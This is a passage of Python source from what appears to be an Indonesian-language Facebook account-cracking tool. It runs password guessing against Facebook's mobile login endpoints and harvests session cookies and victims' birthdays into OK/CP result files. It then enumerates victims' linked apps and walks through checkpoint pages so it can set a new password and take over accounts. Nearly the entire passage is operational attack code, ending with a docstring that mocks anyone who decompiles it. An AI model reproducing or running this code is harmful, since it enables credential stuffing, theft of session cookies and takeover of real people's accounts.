				_headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
				po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
				if 'c_user' in ses.cookies.get_dict():
					try:
						kukis=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
						romz = open('data/token.txt', 'r').read()
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={romz}").json()['birthday']
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print ('\r %s*--> %s ◊ %s ◊ %s %s %s ◊ %s '%(H,user,pw,day,month,year,kukis))
						os.popen("play-audio dapet.mp3")
						ok.append("%s ◊ %s ◊ %s %s %s ◊ %s "%(user,pw,day,month,year,kukis))
						open('OK/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s ◊ %s %s %s ◊ %s \n"%(user,pw,day,month,year,kukis))
						cek_apk(kukis)
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print ('\r %s*--> %s ◊ %s ◊ %s '%(H,user,pw,kukis))
					os.popen("play-audio dapet.mp3")
					ok.append('%s ◊ %s ◊ %s'%(user,pw,kukis))
					open('OK/%s.txt'%(waktu), 'a').write(' *--> %s ◊ %s ◊ %s\n'%(user,pw,kukis))
					cek_apk(kukis)
					break
				elif 'checkpoint' in ses.cookies.get_dict():
					try:
						romz = open('data/token.txt', 'r').read()
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={romz}").json()['birthday']
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print ('\r %s*--> %s ◊ %s ◊ %s %s %s  '%(K,user,pw,day,month,year))
						os.popen("play-audio dapet.mp3")
						cp.append("%s ◊ %s ◊ %s %s %s"%(user,pw,day,month,year))
						open('CP/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s ◊ %s %s %s\n"%(user,pw,day,month,year))
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print ('\r %s*--> %s ◊ %s           '%(K,user,pw))
					os.popen("play-audio dapet.mp3")
					cp.append('%s ◊ %s'%(user,pw))
					open('CP/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s\n"%(user,pw))
					break
				else:
					continue
			loop += 1
		except requests.exceptions.ConnectionError:
			jeda(1)
			loop += 1
			self.basic(user, manual, **data)
	
	# MOBILE
	def mobil(self, user, manual,**data):
		global ok,cp,loop
		warna = random.choice([M, H, K, B, U, O, P, J])
		sys.stdout.write('\r'+warna+'•\x1b[1;96m [crack] %s/%s [%sOK%s:%s%s%s]-[%sCP%s:%s%s%s]'%(loop,len(self.id),H,M,H,len(ok),O,K,M,K,len(cp),O)),
		sys.stdout.flush()
		try:
			for pw in manual:
				pw = pw.lower()
				ses = requests.Session()
				ua = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
				headers_ = {"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
				p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
				dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
				_headers = {"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
				po = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
				if 'c_user' in ses.cookies.get_dict():
					try:
						kukis=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
						romz = open('data/token.txt', 'r').read()
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={romz}").json()['birthday']
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print ('\r %s*--> %s ◊ %s ◊ %s %s %s ◊ %s '%(H,user,pw,day,month,year,kukis))
						os.popen("play-audio dapet.mp3")
						ok.append("%s ◊ %s ◊ %s %s %s ◊ %s "%(user,pw,day,month,year,kukis))
						open('OK/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s ◊ %s %s %s ◊ %s \n"%(user,pw,day,month,year,kukis))
						cek_apk(kukis)
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print ('\r %s*--> %s ◊ %s ◊ %s '%(H,user,pw,kukis))
					os.popen("play-audio dapet.mp3")
					ok.append('%s ◊ %s ◊ %s'%(user,pw,kukis))
					open('OK/%s.txt'%(waktu), 'a').write(' *--> %s ◊ %s ◊ %s\n'%(user,pw,kukis))
					cek_apk(kukis)
					break
				elif 'checkpoint' in ses.cookies.get_dict():
					try:
						romz = open('data/token.txt', 'r').read()
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={romz}").json()['birthday']
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print ('\r %s*--> %s ◊ %s ◊ %s %s %s  '%(K,user,pw,day,month,year))
						os.popen("play-audio dapet.mp3")
						cp.append("%s ◊ %s ◊ %s %s %s"%(user,pw,day,month,year))
						open('CP/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s ◊ %s %s %s\n"%(user,pw,day,month,year))
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print ('\r %s*--> %s ◊ %s           '%(K,user,pw))
					os.popen("play-audio dapet.mp3")
					cp.append('%s ◊ %s'%(user,pw))
					open('CP/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s\n"%(user,pw))
					break
				else:
					continue
			loop += 1
		except requests.exceptions.ConnectionError:
			jeda(1)
			loop += 1
			self.mobil(user, manual, **data)

# SELESAI CRACK
ubah_pass = []
pwbaru = []
pwBaru = []
ubahP = []

def hasil(ok,cp):
	os.popen('play-audio data/selesai.mp3')
	if len(ok) != 0 or len(cp) != 0:
		print("\n%s√ finished"%(H))
		print('%s+%s ---------------------------------------- %s+'%(P,M,P))
		print('%s• %sOK%s : %s%s'%(U,H,M,H,str(len(ok))))
		print('%s• %sCP%s : %s%s'%(U,K,M,K,str(len(cp))))
		print('%s+%s ---------------------------------------- %s+'%(P,M,P))
		if len(cp)==0:
			exit()
		else:
			c = input('\n%s%s%s gunakan detektor checkpoint? y/t%s > %s'%(U,til,O,M,K))
			if c =='':
				exit("%s%s Isi yang benar kentod "%(M,til))
			elif c in['Y','y']:
				jalan("\n%s•%s Mode pesawatkan terlebih dahulu 5 detik "%(U,O))
				pw=input("%s%s%s ubah sandi akun one tab? y/t %s> %s"%(U,til,O,M,K))
				if pw =='':
					print ("%s%s isi yg benar kentod "%(M,til))
				elif pw in['y','Y']:
					ubah_pass.append("ubah_sandi")
					pw2=input("%s%s%s masukan sandi %s> %s"%(U,til,O,M,K))
					if len(pw2) <= 5:
						print("%s%s sandi minimal 6 karakter "%(M,til))
					else:
						pwbaru.append(pw2)
				nomor=0
				for fb in cp:
					akun = fb.replace("\n","")
					ngecek  = akun.split(" ◊ ")
					nomor+=1
					print("\n%s%s.%s login akun %s> %s%s"%(H,str(nomor),O,M,K,akun.replace(" *--> ","")));jeda(0.07)
					try:
						mengecek(ngecek[0].replace(" *--> ",""), ngecek[1])
					except requests.exceptions.ConnectionError:
						sys.stdout.write("\r%s• tidak ada koneksi "%(M)),
						sys.stdout.flush();jeda(1)
						pass
					except:
						pass
				print("\n%s%s%s Selesai mengecek akun"%(U,til,O));jeda(0.07)
				os.popen('play-audio data/cek.mp3')
				input('%s%s%s [%s Enter%s ] '%(U,til,O,U,O))
				pilihan().menu()
			elif c in['t','T']:
				exit()
			else:
				exit ("%s%s isi yg benar kentod "%(M,til))
	else:
		exit(f"\n{M}{til} Ops... tidak mendapatkan hasil :(")

# CEK APLIKASI 
def cek_apk(kukis):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kukis}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r      %s%s. %s%s"%(P,i+1,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r      %s• cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kukis}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r      %s%s. %s%s"%(P,i+1,M,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r      %s• cookie invalid"%(M))

# CEKPOINT DETEKTOR
def file_cp():
	dirs = os.listdir('CP')
	print ("\n%s•%s [%s pilih hasil crack yg tersimpan untuk cek opsi %s]\n"%(U,O,U,O))
	for file in dirs:
		print("%s•%s> %s%s"%(U,M,K,file));jeda(0.07)
	try:
		print("\n%s%s%s Masukan file [ cth%s: %s%s.txt%s ]"%(U,til,O,M,K,waktu,O))
		opsi()
	except IOError:
		print ('%s• file tidak ada'%(M))
		exit()

def opsi():
	CP = ("CP/")
	romi = input("%s%s%s Nama file %s> %s"%(U,til,O,M,K))
	if romi == "":
		print("%s%s isi yang benar "%(M,til));jeda(2)
		opsi()
	try:
		file_cp = open(CP+romi, "r").readlines()
	except IOError:
		exit("\n%s%s nama file %s tidak tersedia"%(M,til,romi))
	jalan("%s•%s Mode pesawatkan terlebih dahulu 5 detik "%(U,O))
	pw=input("\n%s%s%s ubah sandi pada akun one tab? y/t %s> %s"%(U,til,O,M,K))
	if pw in['y','Y']:
		ubah_pass.append("ubah_sandi")
		pw2 = input("%s%s%s masukan sandi %s> %s"%(U,til,O,M,K))
		if len(pw2) <= 5:
			print("%s• sandi minimal 6 karakter "%(M))
		else:
			pwbaru.append(pw2)
	print("\n %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
	print ("%s%s%s total akun %s: %s%s "%(U,til,O,M,K,str(len(file_cp))))
	print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
	nomor = 0
	for fb in file_cp:
		akun = fb.replace("\n","")
		ngecek  = akun.split(" ◊ ")
		nomor+=1
		print("\n%s%s.%s login akun %s> %s%s"%(H,str(nomor),O,M,K,akun.replace(" *--> ","")));jeda(0.07)
		try:
			mengecek(ngecek[0].replace(" *--> ",""), ngecek[1])
		except requests.exceptions.ConnectionError:
			continue
	print("\n%s%s%s Selesai mengecek akun"%(U,til,O));jeda(0.07)
	os.popen('play-audio data/cek.mp3')
	input('%s%s%s [%s Enter%s ] '%(U,til,O,U,O))
	pilihan().menu()
	
data = {}
data2 = {}

def mengecek(user,pw):
	global loop,ubah_pass,pwbaru
	session=requests.Session()
	url = "https://mbasic.facebook.com"
	session.headers.update({"Host":"mbasic.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"})
	soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=session.post(url+link.get("action"),data=data)
	response=bs4.BeautifulSoup(urlPost.text, "html.parser")
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print("\r%s• akun terkunci sesi new"%(M))
		else:
			print("\r%s• akun tidak checkpoint, silahkan anda login "%(H))
			os.popen('play-audio dapet.mp3')
			open('OK/%s.txt'%(waktu), 'a').write(" *--> %s ◊ %s\n" % (user,pw))
	elif "checkpoint" in session.cookies.get_dict():
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=bs4.BeautifulSoup(an.text,"html.parser")
		cek=[cek.text for cek in response2.find_all("option")]
		number=0
		print("\r%s%s%s terdapat %s%s%s opsi %s:"%(U,til,O,P,str(len(cek)),O,M));jeda(0.07)
		if(len(cek)==0):
			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
				if "ubah_sandi" in ubah_pass:
					dat,dat2={},{}
					but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
					for x in response("input"):
						if x.get("name") in but:
							dat.update({x.get("name"):x.get("value")})
					ubahPw=session.post(url+link2.get("action"),data=dat).text
					resUbah=bs4.BeautifulSoup(ubahPw,"html.parser")
					link3=resUbah.find("form",{"method":"post"})
					but2=["submit[Next]","nh","fb_dtsg","jazoest"]
					if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
						for b in resUbah("input"):
							dat2.update({b.get("name"):b.get("value")})
						dat2.update({"password_new":"".join(pwbaru)})
						an=session.post(url+link3.get("action"),data=dat2)
						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
						print("\r%s%s akun one tab, sandi berhasil di ubah \n *--> %s ◊ %s ◊ %s			"%(H,til,user,pwbaru[0],coki))
						os.popen('play-audio dapet.mp3')
						open('OK/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s ◊ %s\n" % (user,pwbaru[0],coki))
						cek_apk(coki)
				else:
					print("\r%s%s akun one tab, silahkan anda login		"%(H,til))
					os.popen('play-audio dapet.mp3')
					open('OK/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s ◊ %s\n" % (user,pw,coki))
					cek_apk(coki)
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\r%s• akun terpasang autentikasi dua faktor			"%(M))
			else:
				print("%s%s terjadi kesalahan"%(M,til))
		else:
			if "c_user" in session.cookies.get_dict():
				print("\r%s• akun tidak checkpoint, silahkan anda login "%(H))
				os.popen('play-audio dapet.mp3')
				open('OK/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s\n" % (user,pw))
		for opsi in range(len(cek)):
			number +=1
			jalan ("  %s%s. %s%s"%(P,str(number),K,cek[opsi]))
	elif "login_error" in str(response):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s• %s"%(M,oh))
	else:
		print("%s%s login gagal, silahkan cek kembali id dan kata sandi"%(M,til))
		
#HAPUS HASIL
def hapus_hasil():
	os.system('rm -rf CP/*.txt && OK/*.txt')
	os.system('rm -rf IG/*.txt')
	print ('');jeda(2)
	jalan (H+' √ berhasil menghapus hasil crack ');jeda(2)
	pilihan().menu()
	
# CEK HASIL
def hasill():
	print ("\n%s%s%s 01 %sCek hasil akun %sOK "%(U,til,P,O,H))
	print ("%s%s%s 02 %sCek hasil akun %sCP "%(U,til,P,O,K))
	print ("%s%s%s 00 %sKembali "%(U,til,M,O))
	
def cek_cek(rom):
	if rom in['']:
		print ('\n%s%s isi yang benar'%(M,til));jeda(2)
		pilihan().menu()
	elif rom in['1','01']:
		hasil_fb()
	elif rom in['2','02']:
		hasil_igehh()
	elif rom in['03','3']:
		hapus_hasil()
	elif rom in['0','00']:
		pilihan().menu()
	else:
		print ('\n%s%s isi yang benar'%(M,til));jeda(2)
		pilihan().menu()
		
# CEK HASIL FACEBOOK
def hasil_fb():
	hasill()
	l = input('\n%s#%s Pilih %s> %s '%(P,O,M,K))
	if l in['']:
		print ('\n%s%s isi yang benar'%(M,til));jeda(2)
		menu()
	elif l in['1','01']:
		dirs = os.listdir('OK')
		print ("\n%s•%s [%s hasil crack yang tersimpan %s]\n"%(U,O,U,O))
		for file in dirs:
			print("%s•%s> %s%s"%(U,M,H,file));jeda(0.07)
		try:
			file = input("\n%s•%s masukan file %s:%s "%(U,O,M,H));jeda(0.2)
			if file in['']:
				exit("%s• isi yang benar kentod"%(M))
			totalok = open('OK/%s'%(file)).read().splitlines()
		except (KeyError, IOError):
			print("%s%s file tidak ada "%(M,til))
		nm_file = ('%s'%(file)).replace('-', ' ')
		file_nm = nm_file.replace('.txt', '')
		print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
		jalan("%s•%s hasil tanggal%s : %s%s %stotal %s: %s%s"%(U,O,M,H,file_nm,O,M,H,len(totalok)))
		print(" %s# %s---------------------------------------- %s#%s"%(P,M,P,H));jeda(2)
		os.system('cat OK/%s'%(file))
		print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
		exit('\n')
	elif l in['2','02']:
		dirs = os.listdir('CP')
		print ("\n%s•%s [%s hasil crack yang tersimpan %s]\n"%(U,O,U,O))
		for file in dirs:
			print("%s•%s> %s%s"%(U,M,K,file));jeda(0.07)
		try:
			file = input("\n%s•%s masukan file %s:%s "%(U,O,M,K));jeda(0.2)
			if file in['']:
				exit("%s• isi yang benar kentod"%(M))
			totalcp = open('CP/%s'%(file)).read().splitlines()
		except (KeyError, IOError):
			print("%s%s file tidak ada "%(M,til))
		nm_file = ('%s'%(file)).replace('-', ' ')
		file_nm = nm_file.replace('.txt', '')
		print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
		jalan("%s•%s hasil tanggal%s : %s%s %stotal%s : %s%s"%(U,O,M,K,file_nm,O,M,K,len(totalcp)))
		print(" %s# %s---------------------------------------- %s#%s"%(P,M,P,K));jeda(2)
		os.system('cat CP/%s'%(file))
		print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
		exit('\n')
	elif l in['0','00']:
		pilihan().menu()
	else:
		print ('\n%s%s isi yang benar'%(M,til));jeda(2)
		pilihan().menu()
		

"""

    Biar apa sih di decompile anyink
    Taekkk !

"""